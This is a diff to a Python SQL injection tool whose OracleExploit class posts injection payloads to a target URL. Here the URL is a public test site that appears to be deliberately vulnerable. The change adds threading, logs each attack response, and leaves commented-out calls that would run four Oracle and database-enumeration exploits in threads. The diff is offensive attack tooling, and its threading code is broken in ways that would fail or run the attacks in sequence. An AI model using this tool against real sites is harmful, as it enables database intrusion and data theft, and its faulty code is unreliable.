@@ -9,6 +9,7 @@ import sys
 import os
 import logging
 import random
+import threading
 
 current_directory = os.getcwd()
 
@@ -74,7 +75,11 @@ headers = {
 
 
 
-class OracleExploit:
+class OracleExploit(
+    threading.Thread
+):
+    def __init__(self):
+        super().__init__(self)
     @staticmethod 
     def Hostname_Attack(urls):
         parameter,_ = extract_parameter_name(urls)
@@ -95,6 +100,7 @@ class OracleExploit:
                 }
                 attack = requests.post(url=urls,data=params)
                 sqljlog.info(f"Testing:{Payloads}")
+                sqljlog.info(attack.text)
             
             else:
                 logger.critical("Host is down.")
@@ -196,5 +202,14 @@ class OracleExploit:
             else:
                 logger.critical("Host is down.")
 
+# threads = [
+#     OracleExploit.db_column_exploit("http://testphp.vulnweb.com/artists.php?artist=1"),
+#     OracleExploit.db_column_list_exploit("http://testphp.vulnweb.com/artists.php?artist=1"),
+#     OracleExploit.oracle_injection_exploit("http://testphp.vulnweb.com/artists.php?artist=1"),
+#     OracleExploit.oracle_injection_database_list_attack("http://testphp.vulnweb.com/artists.php?artist=1")
+# ]
 
-OracleExploit.Hostname_Attack("http://testphp.vulnweb.com/artists.php?artist=1")
+# for thread in threads:
+#     Thread = threading.Thread(thread)
+#     Thread.start()
+#     Thread.join()
